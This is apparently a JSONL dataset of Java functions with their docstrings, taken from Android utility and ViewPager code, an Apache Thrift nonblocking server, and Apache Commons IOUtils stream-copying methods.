{"docstring": "/**\n * get screen height of this cellphone\n * @param context\n * @return\n */\n", "func_signal": "public static int getMobileHeight(Context context)", "code": "{\n\tDisplayMetrics dm = new DisplayMetrics();\n\t((Activity) context).getWindowManager().getDefaultDisplay().getMetrics(dm);\n    int height = dm.heightPixels;  //\u5f97\u5230\u9ad8\u5ea6\n    return height;\n}", "path": "src\\com\\finddreams\\baselib\\utils\\DisplayUtil.java", "repo_name": "finddreams/Android_BaseLib", "stars": 90, "license": "None", "language": "java", "size": 2888}
{"docstring": "/**\n * Set the currently selected page. If the ViewPager has already been through its first\n * layout there will be a smooth animated transition between the current item and the\n * specified item.\n *\n * @param item Item index to select\n */\n", "func_signal": "public void setCurrentItem(int item)", "code": "{\n    mPopulatePending = false;\n    setCurrentItemInternal(item, !mFirstLayout, false);\n}", "path": "src\\com\\finddreams\\baselib\\view\\LazyViewPager.java", "repo_name": "finddreams/Android_BaseLib", "stars": 90, "license": "None", "language": "java", "size": 2888}
{"docstring": "/**\n * Set the currently selected page.\n *\n * @param item Item index to select\n * @param smoothScroll True to smoothly scroll to the new item, false to transition immediately\n */\n", "func_signal": "public void setCurrentItem(int item, boolean smoothScroll)", "code": "{\n    mPopulatePending = false;\n    setCurrentItemInternal(item, smoothScroll, false);\n}", "path": "src\\com\\finddreams\\baselib\\view\\LazyViewPager.java", "repo_name": "finddreams/Android_BaseLib", "stars": 90, "license": "None", "language": "java", "size": 2888}
{"docstring": "/**\n * Set the number of pages that should be retained to either side of the\n * current page in the view hierarchy in an idle state. Pages beyond this\n * limit will be recreated from the adapter when needed.\n *\n * <p>This is offered as an optimization. If you know in advance the number\n * of pages you will need to support or have lazy-loading mechanisms in place\n * on your pages, tweaking this setting can have benefits in perceived smoothness\n * of paging animations and interaction. If you have a small number of pages (3-4)\n * that you can keep active all at once, less time will be spent in layout for\n * newly created view subtrees as the user pages back and forth.</p>\n *\n * <p>You should keep this limit low, especially if your pages have complex layouts.\n * This setting defaults to 1.</p>\n *\n * @param limit How many pages will be kept offscreen in an idle state.\n */\n", "func_signal": "public void setOffscreenPageLimit(int limit)", "code": "{\n    if (limit < DEFAULT_OFFSCREEN_PAGES) {\n        Log.w(TAG, \"Requested offscreen page limit \" + limit + \" too small; defaulting to \" +\n                DEFAULT_OFFSCREEN_PAGES);\n        limit = DEFAULT_OFFSCREEN_PAGES;\n    }\n    if (limit != mOffscreenPageLimit) {\n        mOffscreenPageLimit = limit;\n        populate();\n    }\n}", "path": "src\\com\\finddreams\\baselib\\view\\LazyViewPager.java", "repo_name": "finddreams/Android_BaseLib", "stars": 90, "license": "None", "language": "java", "size": 2888}
{"docstring": "/**\n * You can call this function yourself to have the scroll view perform\n * scrolling from a key event, just as if the event had been dispatched to\n * it by the view hierarchy.\n *\n * @param event The key event to execute.\n * @return Return true if the event was handled, else false.\n */\n", "func_signal": "public boolean executeKeyEvent(KeyEvent event)", "code": "{\n    boolean handled = false;\n    if (event.getAction() == KeyEvent.ACTION_DOWN) {\n        switch (event.getKeyCode()) {\n            case KeyEvent.KEYCODE_DPAD_LEFT:\n                handled = arrowScroll(FOCUS_LEFT);\n                break;\n            case KeyEvent.KEYCODE_DPAD_RIGHT:\n                handled = arrowScroll(FOCUS_RIGHT);\n                break;\n            case KeyEvent.KEYCODE_TAB:\n                if (KeyEventCompat.hasNoModifiers(event)) {\n                    handled = arrowScroll(FOCUS_FORWARD);\n                } else if (KeyEventCompat.hasModifiers(event, KeyEvent.META_SHIFT_ON)) {\n                    handled = arrowScroll(FOCUS_BACKWARD);\n                }\n                break;\n        }\n    }\n    return handled;\n}", "path": "src\\com\\finddreams\\baselib\\view\\LazyViewPager.java", "repo_name": "finddreams/Android_BaseLib", "stars": 90, "license": "None", "language": "java", "size": 2888}
{"docstring": "/**\n * We only want the current page that is being shown to be touchable.\n */\n", "func_signal": "@Override\npublic void addTouchables(ArrayList<View> views)", "code": "{\n    // Note that we don't call super.addTouchables(), which means that\n    // we don't call View.addTouchables().  This is okay because a ViewPager\n    // is itself not touchable.\n    for (int i = 0; i < getChildCount(); i++) {\n        final View child = getChildAt(i);\n        if (child.getVisibility() == VISIBLE) {\n            ItemInfo ii = infoForChild(child);\n            if (ii != null && ii.position == mCurItem) {\n                child.addTouchables(views);\n            }\n        }\n    }\n}", "path": "src\\com\\finddreams\\baselib\\view\\LazyViewPager.java", "repo_name": "finddreams/Android_BaseLib", "stars": 90, "license": "None", "language": "java", "size": 2888}
{"docstring": "/**\n * End a fake drag of the pager.\n *\n * @see #beginFakeDrag()\n * @see #fakeDragBy(float)\n */\n", "func_signal": "public void endFakeDrag()", "code": "{\n    if (!mFakeDragging) {\n        throw new IllegalStateException(\"No fake drag in progress. Call beginFakeDrag first.\");\n    }\n\n    final VelocityTracker velocityTracker = mVelocityTracker;\n    velocityTracker.computeCurrentVelocity(1000, mMaximumVelocity);\n    int initialVelocity = (int)VelocityTrackerCompat.getYVelocity(\n            velocityTracker, mActivePointerId);\n    mPopulatePending = true;\n    if ((Math.abs(initialVelocity) > mMinimumVelocity)\n            || Math.abs(mInitialMotionX-mLastMotionX) >= (getWidth()/3)) {\n        if (mLastMotionX > mInitialMotionX) {\n            setCurrentItemInternal(mCurItem-1, true, true);\n        } else {\n            setCurrentItemInternal(mCurItem+1, true, true);\n        }\n    } else {\n        setCurrentItemInternal(mCurItem, true, true);\n    }\n    endDrag();\n\n    mFakeDragging = false;\n}", "path": "src\\com\\finddreams\\baselib\\view\\LazyViewPager.java", "repo_name": "finddreams/Android_BaseLib", "stars": 90, "license": "None", "language": "java", "size": 2888}
{"docstring": "/**\n * Set a drawable that will be used to fill the margin between pages.\n *\n * @param d Drawable to display between pages\n */\n", "func_signal": "public void setPageMarginDrawable(Drawable d)", "code": "{\n    mMarginDrawable = d;\n    if (d != null) refreshDrawableState();\n    setWillNotDraw(d == null);\n    invalidate();\n}", "path": "src\\com\\finddreams\\baselib\\view\\LazyViewPager.java", "repo_name": "finddreams/Android_BaseLib", "stars": 90, "license": "None", "language": "java", "size": 2888}
{"docstring": "/**\n\t * \u5224\u65adSD\u662f\u5426\u53ef\u4ee5\n\t * \n\t * @return\n\t */\n", "func_signal": "public static boolean isSdcardExist()", "code": "{\n\t\tif (Environment.getExternalStorageState().equals(\n\t\t\t\tEnvironment.MEDIA_MOUNTED)) {\n\t\t\treturn true;\n\t\t}\n\t\treturn false;\n\t}", "path": "src\\com\\finddreams\\baselib\\utils\\FileUtil.java", "repo_name": "finddreams/Android_BaseLib", "stars": 90, "license": "None", "language": "java", "size": 2888}
{"docstring": "/**\n * We only want the current page that is being shown to be focusable.\n */\n", "func_signal": "@Override\npublic void addFocusables(ArrayList<View> views, int direction, int focusableMode)", "code": "{\n    final int focusableCount = views.size();\n\n    final int descendantFocusability = getDescendantFocusability();\n\n    if (descendantFocusability != FOCUS_BLOCK_DESCENDANTS) {\n        for (int i = 0; i < getChildCount(); i++) {\n            final View child = getChildAt(i);\n            if (child.getVisibility() == VISIBLE) {\n                ItemInfo ii = infoForChild(child);\n                if (ii != null && ii.position == mCurItem) {\n                    child.addFocusables(views, direction, focusableMode);\n                }\n            }\n        }\n    }\n\n    // we add ourselves (if focusable) in all cases except for when we are\n    // FOCUS_AFTER_DESCENDANTS and there are some descendants focusable.  this is\n    // to avoid the focus search finding layouts when a more precise search\n    // among the focusable children would be more interesting.\n    if (\n        descendantFocusability != FOCUS_AFTER_DESCENDANTS ||\n            // No focusable descendants\n            (focusableCount == views.size())) {\n        // Note that we can't call the superclass here, because it will\n        // add all views in.  So we need to do the same thing View does.\n        if (!isFocusable()) {\n            return;\n        }\n        if ((focusableMode & FOCUSABLES_TOUCH_MODE) == FOCUSABLES_TOUCH_MODE &&\n                isInTouchMode() && !isFocusableInTouchMode()) {\n            return;\n        }\n        if (views != null) {\n            views.add(this);\n        }\n    }\n}", "path": "src\\com\\finddreams\\baselib\\view\\LazyViewPager.java", "repo_name": "finddreams/Android_BaseLib", "stars": 90, "license": "None", "language": "java", "size": 2888}
{"docstring": "/**\n * get screen width of this cellphone\n * @param context\n * @return\n */\n", "func_signal": "public static int getMobileWidth(Context context)", "code": "{\n\tDisplayMetrics dm = new DisplayMetrics();\n\t((Activity) context).getWindowManager().getDefaultDisplay().getMetrics(dm);\n\tint width = dm.widthPixels;    //\u5f97\u5230\u5bbd\u5ea6\n    return width;\n\t\n}", "path": "src\\com\\finddreams\\baselib\\utils\\DisplayUtil.java", "repo_name": "finddreams/Android_BaseLib", "stars": 90, "license": "None", "language": "java", "size": 2888}
{"docstring": "/**\n * Start a fake drag of the pager.\n *\n * <p>A fake drag can be useful if you want to synchronize the motion of the ViewPager\n * with the touch scrolling of another view, while still letting the ViewPager\n * control the snapping motion and fling behavior. (e.g. parallax-scrolling tabs.)\n * Call {@link #fakeDragBy(float)} to simulate the actual drag motion. Call\n * {@link #endFakeDrag()} to complete the fake drag and fling as necessary.\n *\n * <p>During a fake drag the ViewPager will ignore all touch events. If a real drag\n * is already in progress, this method will return false.\n *\n * @return true if the fake drag began successfully, false if it could not be started.\n *\n * @see #fakeDragBy(float)\n * @see #endFakeDrag()\n */\n", "func_signal": "public boolean beginFakeDrag()", "code": "{\n    if (mIsBeingDragged) {\n        return false;\n    }\n    mFakeDragging = true;\n    setScrollState(SCROLL_STATE_DRAGGING);\n    mInitialMotionX = mLastMotionX = 0;\n    if (mVelocityTracker == null) {\n        mVelocityTracker = VelocityTracker.obtain();\n    } else {\n        mVelocityTracker.clear();\n    }\n    final long time = SystemClock.uptimeMillis();\n    final MotionEvent ev = MotionEvent.obtain(time, time, MotionEvent.ACTION_DOWN, 0, 0, 0);\n    mVelocityTracker.addMovement(ev);\n    ev.recycle();\n    mFakeDragBeginTime = time;\n    return true;\n}", "path": "src\\com\\finddreams\\baselib\\view\\LazyViewPager.java", "repo_name": "finddreams/Android_BaseLib", "stars": 90, "license": "None", "language": "java", "size": 2888}
{"docstring": "/**\n * Tests scrollability within child views of v given a delta of dx.\n *\n * @param v View to test for horizontal scrollability\n * @param checkV Whether the view v passed should itself be checked for scrollability (true),\n *               or just its children (false).\n * @param dx Delta scrolled in pixels\n * @param x X coordinate of the active touch point\n * @param y Y coordinate of the active touch point\n * @return true if child views of v can be scrolled by delta of dx.\n */\n", "func_signal": "protected boolean canScroll(View v, boolean checkV, int dx, int x, int y)", "code": "{\n    if (v instanceof ViewGroup) {\n        final ViewGroup group = (ViewGroup) v;\n        final int scrollX = v.getScrollX();\n        final int scrollY = v.getScrollY();\n        final int count = group.getChildCount();\n        // Count backwards - let topmost views consume scroll distance first.\n        for (int i = count - 1; i >= 0; i--) {\n            // TODO: Add versioned support here for transformed views.\n            // This will not work for transformed views in Honeycomb+\n            final View child = group.getChildAt(i);\n            if (x + scrollX >= child.getLeft() && x + scrollX < child.getRight() &&\n                    y + scrollY >= child.getTop() && y + scrollY < child.getBottom() &&\n                    canScroll(child, true, dx, x + scrollX - child.getLeft(),\n                            y + scrollY - child.getTop())) {\n                return true;\n            }\n        }\n    }\n\n    return checkV && ViewCompat.canScrollHorizontally(v, -dx);\n}", "path": "src\\com\\finddreams\\baselib\\view\\LazyViewPager.java", "repo_name": "finddreams/Android_BaseLib", "stars": 90, "license": "None", "language": "java", "size": 2888}
{"docstring": "/**\n * Fake drag by an offset in pixels. You must have called {@link #beginFakeDrag()} first.\n *\n * @param xOffset Offset in pixels to drag by.\n * @see #beginFakeDrag()\n * @see #endFakeDrag()\n */\n", "func_signal": "public void fakeDragBy(float xOffset)", "code": "{\n    if (!mFakeDragging) {\n        throw new IllegalStateException(\"No fake drag in progress. Call beginFakeDrag first.\");\n    }\n\n    mLastMotionX += xOffset;\n    float scrollX = getScrollX() - xOffset;\n    final int width = getWidth();\n    final int widthWithMargin = width + mPageMargin;\n\n    final float leftBound = Math.max(0, (mCurItem - 1) * widthWithMargin);\n    final float rightBound =\n            Math.min(mCurItem + 1, mAdapter.getCount() - 1) * widthWithMargin;\n    if (scrollX < leftBound) {\n        scrollX = leftBound;\n    } else if (scrollX > rightBound) {\n        scrollX = rightBound;\n    }\n    // Don't lose the rounded component\n    mLastMotionX += scrollX - (int) scrollX;\n    scrollTo((int) scrollX, getScrollY());\n    if (mOnPageChangeListener != null) {\n        final int position = (int) scrollX / widthWithMargin;\n        final int positionOffsetPixels = (int) scrollX % widthWithMargin;\n        final float positionOffset = (float) positionOffsetPixels / widthWithMargin;\n        mOnPageChangeListener.onPageScrolled(position, positionOffset,\n                positionOffsetPixels);\n    }\n\n    // Synthesize an event for the VelocityTracker.\n    final long time = SystemClock.uptimeMillis();\n    final MotionEvent ev = MotionEvent.obtain(mFakeDragBeginTime, time, MotionEvent.ACTION_MOVE,\n            mLastMotionX, 0, 0);\n    mVelocityTracker.addMovement(ev);\n    ev.recycle();\n}", "path": "src\\com\\finddreams\\baselib\\view\\LazyViewPager.java", "repo_name": "finddreams/Android_BaseLib", "stars": 90, "license": "None", "language": "java", "size": 2888}
{"docstring": "/**\n * Add FrameBuffer to the list of select interest changes and wake up the\n * selector if it's blocked. When the select() call exits, it'll give the\n * FrameBuffer a chance to change its interests.\n */\n", "func_signal": "public void requestSelectInterestChange(FrameBuffer frameBuffer)", "code": "{\n  synchronized (selectInterestChanges) {\n    selectInterestChanges.add(frameBuffer);\n  }\n  // wakeup the selector, if it's currently blocked.\n  selector.wakeup();\n}", "path": "src\\org\\apache\\thrift\\server\\TNonblockingServer.java", "repo_name": "jboulon/Honu", "stars": 82, "license": "None", "language": "java", "size": 5865}
{"docstring": "/**\n * Have the server transport start accepting connections.\n *\n * @return true if we started listening successfully, false if something went\n * wrong.\n */\n", "func_signal": "protected boolean startListening()", "code": "{\n  try {\n    serverTransport_.listen();\n    return true;\n  } catch (TTransportException ttx) {\n    LOGGER.error(\"Failed to start listening on server socket!\", ttx);\n    return false;\n  }\n}", "path": "src\\org\\apache\\thrift\\server\\TNonblockingServer.java", "repo_name": "jboulon/Honu", "stars": 82, "license": "None", "language": "java", "size": 5865}
{"docstring": "/**\n * Create server with specified processor factory and server transport.\n * TBinaryProtocol is assumed. TFramedTransport.Factory is used on both input\n * and output transports.\n */\n", "func_signal": "public TNonblockingServer(TProcessorFactory processorFactory,\n                          TNonblockingServerTransport serverTransport)", "code": "{\n  this(processorFactory, serverTransport,\n       new TFramedTransport.Factory(), new TFramedTransport.Factory(),\n       new TBinaryProtocol.Factory(), new TBinaryProtocol.Factory());\n}", "path": "src\\org\\apache\\thrift\\server\\TNonblockingServer.java", "repo_name": "jboulon/Honu", "stars": 82, "license": "None", "language": "java", "size": 5865}
{"docstring": "/**\n * Do the work required to read from a readable client. If the frame is\n * fully read, then invoke the method call.\n */\n", "func_signal": "private void handleRead(SelectionKey key)", "code": "{\n  FrameBuffer buffer = (FrameBuffer)key.attachment();\n  if (buffer.read()) {\n    // if the buffer's frame read is complete, invoke the method.\n    if (buffer.isFrameFullyRead()) {\n      requestInvoke(buffer);\n    }\n  } else {\n    cleanupSelectionkey(key);\n  }\n}", "path": "src\\org\\apache\\thrift\\server\\TNonblockingServer.java", "repo_name": "jboulon/Honu", "stars": 82, "license": "None", "language": "java", "size": 5865}
{"docstring": "/**\n * Give this FrameBuffer a chance to set its interest to write, once data\n * has come in.\n */\n", "func_signal": "public void changeSelectInterests()", "code": "{\n  if (state_ == AWAITING_REGISTER_WRITE) {\n    // set the OP_WRITE interest\n    selectionKey_.interestOps(SelectionKey.OP_WRITE);\n    state_ = WRITING;\n  } else if (state_ == AWAITING_REGISTER_READ) {\n    prepareRead();\n  } else if (state_ == AWAITING_CLOSE){\n    close();\n    selectionKey_.cancel();\n  } else {\n    LOGGER.error(\n      \"changeSelectInterest was called, but state is invalid (\"\n      + state_ + \")\");\n  }\n}", "path": "src\\org\\apache\\thrift\\server\\TNonblockingServer.java", "repo_name": "jboulon/Honu", "stars": 82, "license": "None", "language": "java", "size": 5865}
{"docstring": "/**\n * Give this FrameBuffer a chance to read. The selector loop should have\n * received a read event for this FrameBuffer.\n *\n * @return true if the connection should live on, false if it should be\n * closed\n */\n", "func_signal": "public boolean read()", "code": "{\n  if (state_ == READING_FRAME_SIZE) {\n    // try to read the frame size completely\n    if (!internalRead()) {\n      return false;\n    }\n\n    // if the frame size has been read completely, then prepare to read the\n    // actual frame.\n    if (buffer_.remaining() == 0) {\n      // pull out the frame size as an integer.\n      int frameSize = buffer_.getInt(0);\n       if (frameSize <= 0) {\n        LOGGER.error(\"Read an invalid frame size of \" + frameSize\n          + \". Are you using TFramedTransport on the client side?\");\n        return false;\n      }\n\n      // if this frame will always be too large for this server, log the\n      // error and close the connection.\n      if (frameSize + 4 > MAX_READ_BUFFER_BYTES) {\n        LOGGER.error(\"Read a frame size of \" + frameSize\n          + \", which is bigger than the maximum allowable buffer size for ALL connections.\");\n        return false;\n      }\n\n      // if this frame will push us over the memory limit, then return.\n      // with luck, more memory will free up the next time around.\n      if (readBufferBytesAllocated + frameSize + 4 > MAX_READ_BUFFER_BYTES) {\n        return true;\n      }\n\n      // incremement the amount of memory allocated to read buffers\n      readBufferBytesAllocated += frameSize + 4;\n\n      // reallocate the readbuffer as a frame-sized buffer\n      buffer_ = ByteBuffer.allocate(frameSize + 4);\n      // put the frame size at the head of the buffer\n      buffer_.putInt(frameSize);\n\n      state_ = READING_FRAME;\n    } else {\n      // this skips the check of READING_FRAME state below, since we can't\n      // possibly go on to that state if there's data left to be read at\n      // this one.\n      return true;\n    }\n  }\n\n  // it is possible to fall through from the READING_FRAME_SIZE section\n  // to READING_FRAME if there's already some frame data available once\n  // READING_FRAME_SIZE is complete.\n\n  if (state_ == READING_FRAME) {\n    if (!internalRead()) {\n      return false;\n    }\n\n    // since we're already in the select loop here for sure, we can just\n    // modify our selection key directly.\n    if (buffer_.remaining() == 0) {\n      // get rid of the read select interests\n      selectionKey_.interestOps(0);\n      state_ = READ_FRAME_COMPLETE;\n    }\n\n    return true;\n  }\n\n  // if we fall through to this point, then the state must be invalid.\n  LOGGER.error(\"Read was called but state is invalid (\" + state_ + \")\");\n  return false;\n}", "path": "src\\org\\apache\\thrift\\server\\TNonblockingServer.java", "repo_name": "jboulon/Honu", "stars": 82, "license": "None", "language": "java", "size": 5865}
{"docstring": "/**\n * Do connection-close cleanup on a given SelectionKey.\n */\n", "func_signal": "private void cleanupSelectionkey(SelectionKey key)", "code": "{\n  // remove the records from the two maps\n  FrameBuffer buffer = (FrameBuffer)key.attachment();\n  if (buffer != null) {\n    // close the buffer\n    buffer.close();\n  }\n  // cancel the selection key\n  key.cancel();\n}", "path": "src\\org\\apache\\thrift\\server\\TNonblockingServer.java", "repo_name": "jboulon/Honu", "stars": 82, "license": "None", "language": "java", "size": 5865}
{"docstring": "/**\n * Give this FrameBuffer a chance to write its output to the final client.\n */\n", "func_signal": "public boolean write()", "code": "{\n  if (state_ == WRITING) {\n    try {\n      if (trans_.write(buffer_) < 0) {\n        return false;\n      }\n    } catch (IOException e) {\n      LOGGER.warn(\"Got an IOException during write!\", e);\n      return false;\n    }\n\n    // we're done writing. now we need to switch back to reading.\n    if (buffer_.remaining() == 0) {\n      prepareRead();\n    }\n    return true;\n  }\n\n  LOGGER.error(\"Write was called, but state is invalid (\" + state_ + \")\");\n  return false;\n}", "path": "src\\org\\apache\\thrift\\server\\TNonblockingServer.java", "repo_name": "jboulon/Honu", "stars": 82, "license": "None", "language": "java", "size": 5865}
{"docstring": "/**\n * After the processor has processed the invocation, whatever thread is\n * managing invocations should call this method on this FrameBuffer so we\n * know it's time to start trying to write again. Also, if it turns out\n * that there actually isn't any data in the response buffer, we'll skip\n * trying to write and instead go back to reading.\n */\n", "func_signal": "public void responseReady()", "code": "{\n  // the read buffer is definitely no longer in use, so we will decrement\n  // our read buffer count. we do this here as well as in close because\n  // we'd like to free this read memory up as quickly as possible for other\n  // clients.\n  readBufferBytesAllocated -= buffer_.array().length;\n\n  if (response_.len() == 0) {\n    // go straight to reading again. this was probably an oneway method\n    state_ = AWAITING_REGISTER_READ;\n    buffer_ = null;\n  } else {\n    buffer_ = ByteBuffer.wrap(response_.get(), 0, response_.len());\n\n    // set state that we're waiting to be switched to write. we do this\n    // asynchronously through requestSelectInterestChange() because there is a\n    // possibility that we're not in the main thread, and thus currently\n    // blocked in select(). (this functionality is in place for the sake of\n    // the HsHa server.)\n    state_ = AWAITING_REGISTER_WRITE;\n  }\n  requestSelectInterestChange();\n}", "path": "src\\org\\apache\\thrift\\server\\TNonblockingServer.java", "repo_name": "jboulon/Honu", "stars": 82, "license": "None", "language": "java", "size": 5865}
{"docstring": "/**\n * Begin accepting connections and processing invocations.\n */\n", "func_signal": "public void serve()", "code": "{\n  // start listening, or exit\n  if (!startListening()) {\n    return;\n  }\n\n  // start the selector, or exit\n  if (!startSelectorThread()) {\n    return;\n  }\n\n  // this will block while we serve\n  joinSelector();\n\n  // do a little cleanup\n  stopListening();\n}", "path": "src\\org\\apache\\thrift\\server\\TNonblockingServer.java", "repo_name": "jboulon/Honu", "stars": 82, "license": "None", "language": "java", "size": 5865}
{"docstring": "/**\n * Actually invoke the method signified by this FrameBuffer.\n */\n", "func_signal": "public void invoke()", "code": "{\n  TTransport inTrans = getInputTransport();\n  TProtocol inProt = inputProtocolFactory_.getProtocol(inTrans);\n  TProtocol outProt = outputProtocolFactory_.getProtocol(getOutputTransport());\n\n  try {\n    processorFactory_.getProcessor(inTrans).process(inProt, outProt);\n    responseReady();\n    return;\n  } catch (TException te) {\n    LOGGER.warn(\"Exception while invoking!\", te);\n  } catch (Exception e) {\n    LOGGER.error(\"Unexpected exception while invoking!\", e);\n  }\n  // This will only be reached when there is an exception.\n  state_ = AWAITING_CLOSE;\n  requestSelectInterestChange();\n}", "path": "src\\org\\apache\\thrift\\server\\TNonblockingServer.java", "repo_name": "jboulon/Honu", "stars": 82, "license": "None", "language": "java", "size": 5865}
{"docstring": "/**\n * Set up the SelectorThread.\n */\n", "func_signal": "public SelectThread(final TNonblockingServerTransport serverTransport)\nthrows IOException", "code": "{\n  this.serverTransport = serverTransport;\n  this.selector = SelectorProvider.provider().openSelector();\n  serverTransport.registerSelector(selector);\n}", "path": "src\\org\\apache\\thrift\\server\\TNonblockingServer.java", "repo_name": "jboulon/Honu", "stars": 82, "license": "None", "language": "java", "size": 5865}
{"docstring": "/**\n * Perform a read into buffer.\n *\n * @return true if the read succeeded, false if there was an error or the\n * connection closed.\n */\n", "func_signal": "private boolean internalRead()", "code": "{\n  try {\n    if (trans_.read(buffer_) < 0) {\n      return false;\n    }\n    return true;\n  } catch (IOException e) {\n    LOGGER.warn(\"Got an IOException in internalRead!\", e);\n    return false;\n  }\n}", "path": "src\\org\\apache\\thrift\\server\\TNonblockingServer.java", "repo_name": "jboulon/Honu", "stars": 82, "license": "None", "language": "java", "size": 5865}
{"docstring": "/**\n * Stop serving and shut everything down.\n */\n", "func_signal": "public void stop()", "code": "{\n  stopped_ = true;\n  if (selectThread_ != null) {\n    selectThread_.wakeupSelector();\n  }\n}", "path": "src\\org\\apache\\thrift\\server\\TNonblockingServer.java", "repo_name": "jboulon/Honu", "stars": 82, "license": "None", "language": "java", "size": 5865}
{"docstring": "/**\n * Get the transport that should be used by the invoker for responding.\n */\n", "func_signal": "private TTransport getOutputTransport()", "code": "{\n  response_ = new TByteArrayOutputStream();\n  return outputTransportFactory_.getTransport(new TIOStreamTransport(response_));\n}", "path": "src\\org\\apache\\thrift\\server\\TNonblockingServer.java", "repo_name": "jboulon/Honu", "stars": 82, "license": "None", "language": "java", "size": 5865}
{"docstring": "/**\n * Accept a new connection.\n */\n", "func_signal": "private void handleAccept() throws IOException", "code": "{\n  SelectionKey clientKey = null;\n  TNonblockingTransport client = null;\n  try {\n    // accept the connection\n    client = (TNonblockingTransport)serverTransport.accept();\n    clientKey = client.registerSelector(selector, SelectionKey.OP_READ);\n\n    // add this key to the map\n    FrameBuffer frameBuffer = new FrameBuffer(client, clientKey);\n    clientKey.attach(frameBuffer);\n  } catch (TTransportException tte) {\n    // something went wrong accepting.\n    LOGGER.warn(\"Exception trying to accept!\", tte);\n    tte.printStackTrace();\n    if (clientKey != null) cleanupSelectionkey(clientKey);\n    if (client != null) client.close();\n  }\n}", "path": "src\\org\\apache\\thrift\\server\\TNonblockingServer.java", "repo_name": "jboulon/Honu", "stars": 82, "license": "None", "language": "java", "size": 5865}
{"docstring": "/**\n * Start the selector thread running to deal with clients.\n *\n * @return true if everything went ok, false if we couldn't start for some\n * reason.\n */\n", "func_signal": "protected boolean startSelectorThread()", "code": "{\n  // start the selector\n  try {\n    selectThread_ = new SelectThread((TNonblockingServerTransport)serverTransport_);\n    selectThread_.start();\n    return true;\n  } catch (IOException e) {\n    LOGGER.error(\"Failed to start selector thread!\", e);\n    return false;\n  }\n}", "path": "src\\org\\apache\\thrift\\server\\TNonblockingServer.java", "repo_name": "jboulon/Honu", "stars": 82, "license": "None", "language": "java", "size": 5865}
{"docstring": "/**\n * We're done writing, so reset our interest ops and change state accordingly.\n */\n", "func_signal": "private void prepareRead()", "code": "{\n  // we can set our interest directly without using the queue because\n  // we're in the select thread.\n  selectionKey_.interestOps(SelectionKey.OP_READ);\n  // get ready for another go-around\n  buffer_ = ByteBuffer.allocate(4);\n  state_ = READING_FRAME_SIZE;\n}", "path": "src\\org\\apache\\thrift\\server\\TNonblockingServer.java", "repo_name": "jboulon/Honu", "stars": 82, "license": "None", "language": "java", "size": 5865}
{"docstring": "/**\n * Check to see if there are any FrameBuffers that have switched their\n * interest type from read to write or vice versa.\n */\n", "func_signal": "private void processInterestChanges()", "code": "{\n  synchronized (selectInterestChanges) {\n    for (FrameBuffer fb : selectInterestChanges) {\n      fb.changeSelectInterests();\n    }\n    selectInterestChanges.clear();\n  }\n}", "path": "src\\org\\apache\\thrift\\server\\TNonblockingServer.java", "repo_name": "jboulon/Honu", "stars": 82, "license": "None", "language": "java", "size": 5865}
{"docstring": "/**\n * The work loop. Handles both selecting (all IO operations) and managing\n * the selection preferences of all existing connections.\n */\n", "func_signal": "public void run()", "code": "{\n  while (!stopped_) {\n    select();\n    processInterestChanges();\n  }\n}", "path": "src\\org\\apache\\thrift\\server\\TNonblockingServer.java", "repo_name": "jboulon/Honu", "stars": 82, "license": "None", "language": "java", "size": 5865}
{"docstring": "/**\n * Skip the requested number of characters or fail if there are not enough left.\n * <p>\n * This allows for the possibility that {@link Reader#skip(long)} may\n * not skip as many characters as requested (most likely because of reaching EOF).\n * \n * @param input stream to skip\n * @param toSkip the number of characters to skip\n * @see Reader#skip(long)\n * \n * @throws IOException if there is a problem reading the file\n * @throws IllegalArgumentException if toSkip is negative\n * @throws EOFException if the number of characters skipped was incorrect\n * @since 2.0\n */\n", "func_signal": "public static void skipFully(Reader input, long toSkip) throws IOException", "code": "{\n    long skipped = skip(input, toSkip);\n    if (skipped != toSkip) {\n        throw new EOFException(\"Chars to skip: \" + toSkip + \" actual: \" + skipped);\n    }\n}", "path": "src\\org\\apache\\commons\\io\\IOUtils.java", "repo_name": "kghost/ics-openvpn", "stars": 92, "license": "other", "language": "java", "size": 1465}
{"docstring": "/**\n * Copy bytes from an <code>InputStream</code> to chars on a\n * <code>Writer</code> using the specified character encoding.\n * <p>\n * This method buffers the input internally, so there is no need to use a\n * <code>BufferedInputStream</code>.\n * <p>\n * Character encoding names can be found at\n * <a href=\"http://www.iana.org/assignments/character-sets\">IANA</a>.\n * <p>\n * This method uses {@link InputStreamReader}.\n *\n * @param input  the <code>InputStream</code> to read from\n * @param output  the <code>Writer</code> to write to\n * @param encoding  the encoding to use, null means platform default\n * @throws NullPointerException if the input or output is null\n * @throws IOException if an I/O error occurs\n * @since 1.1\n */\n", "func_signal": "public static void copy(InputStream input, Writer output, String encoding)\n        throws IOException", "code": "{\n    if (encoding == null) {\n        copy(input, output);\n    } else {\n        InputStreamReader in = new InputStreamReader(input, encoding);\n        copy(in, output);\n    }\n}", "path": "src\\org\\apache\\commons\\io\\IOUtils.java", "repo_name": "kghost/ics-openvpn", "stars": 92, "license": "other", "language": "java", "size": 1465}
{"docstring": "/**\n * Copy bytes from a large (over 2GB) <code>InputStream</code> to an\n * <code>OutputStream</code>.\n * <p>\n * This method uses the provided buffer, so there is no need to use a\n * <code>BufferedInputStream</code>.\n * <p>\n * \n * @param input  the <code>InputStream</code> to read from\n * @param output  the <code>OutputStream</code> to write to\n * @param buffer the buffer to use for the copy\n * @return the number of bytes copied\n * @throws NullPointerException if the input or output is null\n * @throws IOException if an I/O error occurs\n * @since 2.2\n */\n", "func_signal": "public static long copyLarge(InputStream input, OutputStream output, byte[] buffer)\n        throws IOException", "code": "{\n    long count = 0;\n    int n = 0;\n    while (EOF != (n = input.read(buffer))) {\n        output.write(buffer, 0, n);\n        count += n;\n    }\n    return count;\n}", "path": "src\\org\\apache\\commons\\io\\IOUtils.java", "repo_name": "kghost/ics-openvpn", "stars": 92, "license": "other", "language": "java", "size": 1465}
{"docstring": "/**\n * Writes chars from a <code>char[]</code> to bytes on an\n * <code>OutputStream</code>.\n * <p>\n * This method uses {@link String#String(char[])} and\n * {@link String#getBytes()}.\n * \n * @param data  the char array to write, do not modify during output,\n * null ignored\n * @param output  the <code>OutputStream</code> to write to\n * @throws NullPointerException if output is null\n * @throws IOException if an I/O error occurs\n * @since 1.1\n */\n", "func_signal": "public static void write(char[] data, OutputStream output)\n        throws IOException", "code": "{\n    if (data != null) {\n        output.write(new String(data).getBytes());\n    }\n}", "path": "src\\org\\apache\\commons\\io\\IOUtils.java", "repo_name": "kghost/ics-openvpn", "stars": 92, "license": "other", "language": "java", "size": 1465}
